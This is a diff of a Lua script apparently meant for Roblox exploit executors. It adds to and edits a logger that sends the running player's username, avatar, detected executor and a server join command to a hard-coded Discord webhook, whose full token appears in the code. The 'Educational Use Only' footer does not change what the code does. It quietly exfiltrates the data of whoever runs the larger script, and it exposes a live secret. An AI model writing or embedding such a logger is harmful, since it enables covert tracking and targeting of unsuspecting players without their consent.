@@ -121,10 +121,14 @@ if Brookhaven then
 end
 
 
+if getgenv().LoggerRan then return end
+getgenv().LoggerRan = true
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- I-REPLACE ITO ng sarili mong webhook:
 local webhookUrl = "https://discord.com/api/webhooks/1383492519819612250/MLMPB16V8oksbyb_YiKbS-M7pLThXSGyV8gi13Z3EFxkmoYfqPAOmBT4omsOQfHromdu"
 
 -- Detect executor
@@ -144,7 +148,7 @@ local function detectExecutor()
     end
 end
 
--- Per-executor theme color & tagline
+-- Executor theme: color + tagline
 local function getExecutorTheme(executor)
     local themes = {
         ["Synapse X"] = { color = 0x7289DA, tagline = "⚡ Running on Synapse X" },
@@ -156,15 +160,17 @@ local function getExecutorTheme(executor)
     return themes[executor] or themes["Unknown"]
 end
 
+-- Join script
 local function createJoinScript()
     return string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId)
 end
 
+-- Roblox avatar
 local function getAvatarUrl(userId)
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
 end
 
--- Send the Discord log
+-- Send webhook
 local function sendLog()
     local executor = detectExecutor()
     local theme = getExecutorTheme(executor)
@@ -205,7 +211,7 @@ local function sendLog()
                 ["url"] = getAvatarUrl(LocalPlayer.UserId)
             },
             ["footer"] = {
-                ["text"] = "Grow a Garden Logger - Educational Use Only"
+                ["text"] = "Logger • Educational Use Only • ID: " .. HttpService:GenerateGUID(false)
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
@@ -216,9 +222,9 @@ local function sendLog()
     end)
 
     if not success then
-        warn("[Logger] Failed to send webhook: ", err)
+        warn("[LOGGER FAILED]:", err)
     end
 end
 
--- Execute logger
+-- Run it
 sendLog()
